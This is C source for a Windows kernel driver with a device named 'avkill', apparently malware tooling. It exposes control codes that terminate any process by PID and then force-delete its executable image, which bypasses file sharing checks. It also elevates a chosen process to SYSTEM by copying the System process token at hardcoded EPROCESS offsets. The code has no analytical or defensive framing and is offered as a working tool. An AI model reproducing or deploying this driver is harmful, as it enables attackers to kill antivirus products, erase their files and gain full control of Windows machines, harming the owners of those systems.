#define IOCTL_KILL	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0001, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define IOCTL_ELEVATE	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0002, METHOD_BUFFERED, FILE_WRITE_DATA)
#define IOCTL_TEST	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0003, METHOD_BUFFERED, FILE_WRITE_DATA)
#define DEBUG true
#include <ntifs.h>
#include "Common.h"

NTSTATUS ProcessElevation(ULONG TargetPid) {
    PEPROCESS privProc, targetProcess;
    NTSTATUS status = STATUS_SUCCESS;

    status = PsLookupProcessByProcessId(ULongToHandle(TargetPid), &targetProcess);
    status = PsLookupProcessByProcessId(ULongToHandle(4), &privProc);
    UINT64 tokenOffest[3] = { 0x360, 0x358, 0x4b8};
    for (int i = 0; i < 3; i++)
    {
        *(UINT64*)((UINT64)targetProcess + tokenOffest[i]) = *(UINT64*)((UINT64)privProc + tokenOffest[i]);
        DbgPrint("Trying to elevate privileges...\n");
    }
    return status;
}

NTSTATUS TerminateProcess(ULONG TargetProcID) {

	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS PeProc = { 0 };
	status = PsLookupProcessByProcessId((HANDLE)TargetProcID, &PeProc);
	HANDLE ProcessHandle;
	status = ObOpenObjectByPointer(PeProc, NULL, NULL, STANDARD_RIGHTS_ALL, *PsProcessType, KernelMode, &ProcessHandle);
    
	ZwTerminateProcess(ProcessHandle, 0);
	ZwClose(ProcessHandle);
	return status;
}


NTSTATUS ForceDeleteFile(PUNICODE_STRING pathToFile)
{
    OBJECT_ATTRIBUTES fObject;
    HANDLE fileHandle;
    IO_STATUS_BLOCK ioBlock;
    DEVICE_OBJECT* device_object = NULL;
    FILE_OBJECT* object;
    PEPROCESS eproc = IoGetCurrentProcess();
    KeAttachProcess(eproc);
    InitializeObjectAttributes(&fObject, pathToFile, OBJ_CASE_INSENSITIVE, NULL, NULL);
    NTSTATUS result = IoCreateFileSpecifyDeviceObjectHint(&fileHandle,
        SYNCHRONIZE | FILE_WRITE_ATTRIBUTES | FILE_READ_ATTRIBUTES | FILE_READ_DATA,
        &fObject, &ioBlock,
        NULL,
        NULL,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        NULL,
        CreateFileTypeNone,
        NULL,
        IO_IGNORE_SHARE_ACCESS_CHECK,
        device_object);

    if (NT_SUCCESS(result))
    {
        result = ObReferenceObjectByHandle(fileHandle, 0, 0, 0, (PVOID*)&object, 0);
        if (NT_SUCCESS(result)) {
            object->SectionObjectPointer->ImageSectionObject = 0;
            object->DeleteAccess = 1;
            ObDereferenceObject(object);
            ZwClose(fileHandle);
            result = ZwDeleteFile(&fObject);
        }
        else{
            ZwClose(fileHandle);
        }
    }

    KeDetachProcess();
    return result;
}

NTSTATUS DriverDispatcher(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION IrpStack = IoGetCurrentIrpStackLocation(Irp);
    HANDLE h;

    PEPROCESS proc;
    ULONG DataLength;
    InputData* Data;
    ULONG a;
    if (IrpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_KILL) {
        Data = (InputData*)Irp->AssociatedIrp.SystemBuffer;
        if (Data->pid == 0 || Data->pid == 4) {
            NTSTATUS status = STATUS_INVALID_PARAMETER;
            return status;
        }
        if (NULL == ZwQueryInformationProcess) {
            UNICODE_STRING routineName;
            RtlInitUnicodeString(&routineName, L"ZwQueryInformationProcess");
            ZwQueryInformationProcess =
                (PQUERY_INFO_PROCESS)MmGetSystemRoutineAddress(&routineName);
            if (NULL == ZwQueryInformationProcess) {
                DbgPrint("Cannot resolve ZwQueryInformationProcess\n");
            }
        }
        PsLookupProcessByProcessId(ULongToHandle(Data->pid), &proc);
        if (!NT_SUCCESS(ObOpenObjectByPointer(proc, NULL, NULL, NULL, NULL, KernelMode, &h))) {
            DbgPrint("OprnProcess error\n");
        }
        UNICODE_STRING path[260];
        if (!NT_SUCCESS(ZwQueryInformationProcess(h, ProcessImageFileName, &path, sizeof(path), &a))) {
            DbgPrint("ZwQueryInformationProcess error!\n");

        }
        else {
            DbgPrint("%wZ\n", path);

            if(NT_SUCCESS(TerminateProcess(Data->pid))){
                DbgPrint("Kill %d\n", Data->pid);
                NTSTATUS status = ForceDeleteFile(path);
                DbgPrint("Error %X\n",status);
            }

        }

        Irp->IoStatus.Status = STATUS_SUCCESS;
        Irp->IoStatus.Information = 0;
    }
    if (IrpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_ELEVATE)
    {
        DataLength = IrpStack->Parameters.DeviceIoControl.InputBufferLength;
        Data = (InputData*)Irp->AssociatedIrp.SystemBuffer;
        DbgPrint("Elevate %d\n", Data->pid);
        ProcessElevation(Data->pid);
        Irp->IoStatus.Status = STATUS_SUCCESS;
        Irp->IoStatus.Information = 0;
   
    }
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS DriverCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

 NTSTATUS DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\DosDevices\\avkill");
    IoDeleteSymbolicLink(&symLink);
    IoDeleteDevice(DriverObject->DeviceObject);
    return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    DbgPrint("[+] Drv started\n");
    DriverObject->DriverUnload = (PDRIVER_UNLOAD)DriverUnload;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDispatcher;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverCreateClose;

    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\avkill");
    PDEVICE_OBJECT DeviceObject;
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\DosDevices\\avkill");
    
    NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DeviceObject);
    DriverObject->Flags |= DO_BUFFERED_IO;
    status = IoCreateSymbolicLink(&symLink, &devName);
    return STATUS_SUCCESS;

}
